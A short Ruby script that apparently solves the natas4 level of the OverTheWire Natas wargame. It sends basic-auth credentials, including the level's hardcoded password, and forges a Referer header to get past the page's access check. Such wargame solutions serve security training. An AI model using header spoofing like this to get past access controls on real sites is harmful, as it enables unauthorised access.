#!/usr/bin/ruby
require "net/http"

username = "natas4"
password = "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"

url = URI.parse "http://%s.natas.labs.overthewire.org/" % [username]
client = Net::HTTP.new url.host, url.port

req = Net::HTTP::Get.new url
req.basic_auth username, password

req['Referer'] = "http://natas5.natas.labs.overthewire.org/"

print (client.request req).body